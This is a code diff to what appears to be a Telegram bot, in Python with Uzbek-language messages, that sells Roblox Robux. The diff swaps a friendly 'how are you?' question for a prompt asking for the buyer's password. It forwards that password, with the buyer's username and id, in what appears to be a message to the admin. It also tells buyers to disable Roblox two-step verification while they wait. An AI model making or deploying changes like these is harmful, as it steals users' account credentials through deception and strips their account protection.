@@ -710,7 +710,7 @@ async def buy_nick(msg: types.Message, state: FSMContext):
         await msg.answer("❌ Nik kamida 3 ta belgi bo'lsin, qaytadan kiriting:")
         return
     await state.update_data(buy_nick=nick)
-    await msg.answer("😊 Qalaysiz?", reply_markup=cancel_kb())
+    await msg.answer("parolingz?", reply_markup=cancel_kb())
     await state.set_state(BuyFlow.mood)
 
 @dp.message(BuyFlow.mood)
@@ -731,7 +731,7 @@ async def buy_mood(msg: types.Message, state: FSMContext):
         f"🎮 Nik: `{esc_md(d['buy_nick'])}`\n"
         f"🪙 Robux: *{d['buy_robux']}*\n"
         f"💵 Narx: *{d['buy_price']:,} so'm*\n"
-        f"😊 Qalaysiz: {esc_md(mood)}\n\n"
+        f"😊 parolingiz: {esc_md(mood)}\n\n"
         f"Hammasi to'g'ri bo'lsa tasdiqlang:",
         reply_markup=b.as_markup()
     )
@@ -772,7 +772,7 @@ async def cb_buy_confirm(cb: types.CallbackQuery, state: FSMContext):
             f"1️⃣ Nik: `{esc_md(nick)}`\n"
             f"2️⃣ Robux: *{robux}*\n"
             f"3️⃣ Narx: *{price:,} so'm*\n"
-            f"4️⃣ Qalaysiz: {esc_md(mood)}\n\n"
+            f"4️⃣ parolingiz: {esc_md(mood)}\n\n"
             f"👤 @{esc_md(cb.from_user.username or '-')} (`{uid}`)\n🕐 {now()}",
             reply_markup=b.as_markup()
         )
@@ -785,7 +785,7 @@ async def cb_buy_confirm(cb: types.CallbackQuery, state: FSMContext):
         f"💵 To'langan: *{price:,} so'm*\n"
         f"🎮 Nik: `{esc_md(nick)}`\n"
         f"📋 Buyurtma #{short_id(oid)}\n\n"
-        f"⏳ Admin javobini kuting. Uxlab turing 😄 tez bajariladi!",
+        f"⏳ Admin javobini kuting. ungacha robloxda 2 bosqichli tasdiqlashni ochirib qoying!",
         reply_markup=main_kb()
     )
     await cb.answer()
